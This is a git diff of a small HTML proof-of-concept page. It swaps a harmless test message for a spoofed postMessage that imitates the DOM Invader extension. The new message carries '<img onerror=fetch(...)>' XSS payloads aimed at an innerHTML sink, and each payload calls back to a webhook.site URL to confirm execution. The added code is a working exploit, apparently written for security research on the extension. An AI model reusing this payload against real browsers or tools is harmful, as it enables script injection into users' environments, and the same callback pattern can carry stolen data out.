@@ -1,46 +1,19 @@
 <!DOCTYPE html>
 <html>
-<head>
-    <title>DOM Invader - Clean Message Test</title>
-</head>
-<body style="background:#111;color:#0f0;text-align:center;padding-top:120px;font-family:sans-serif;">
-
-    <h1>DOM Invader PoC (Safe)</h1>
-
-    <button onclick="sendMessage()" style="padding:15px 30px;font-size:18px;">
-        SEND POSTMESSAGE
-    </button>
-
-    <p id="status" style="margin-top:20px;color:#aaa;">Waiting...</p>
-
-    <script>
-        const webhook = "https://webhook.site/d7b0c1e7-9c88-415f-bc83-f4b67cc847cd";
-
-        function sendMessage() {
-
-            document.getElementById('status').innerText =
-                "Message sent. Check DOM Invader (if it processes postMessage).";
-
-            const message = {
-                source: "dom-invader",
-                type: "augmented-dom",
-                data: {
-                    sink: "test-sink",
-                    value: "TEST_VALUE",
-                    stackTrace: "TEST_STACK"
-                }
-            };
-
-            // optional evidence logging (NOT execution)
-            fetch(webhook + "?sent=1&time=" + Date.now(), {
-                mode: "no-cors"
-            });
-
-            window.postMessage(message, "*");
-
-            console.log("postMessage sent:", message);
+<body>
+<script>
+    const webhook = "https://webhook.site/d7b0c1e7-9c88-415f-bc83-f4b67cc847cd";
+    
+    // بعت الـ postMessage بس - من غير أي innerHTML في صفحتك
+    window.postMessage({
+        "source": "dom-invader",
+        "type": "augmented-dom",
+        "data": {
+            "sink": "innerHTML",
+            "value": "<img src=x onerror=fetch('" + webhook + "?from=extension')>",
+            "stackTrace": "<img src=x onerror=fetch('" + webhook + "?from=stacktrace')>"
         }
-    </script>
-
+    }, "*");
+</script>
 </body>
 </html>
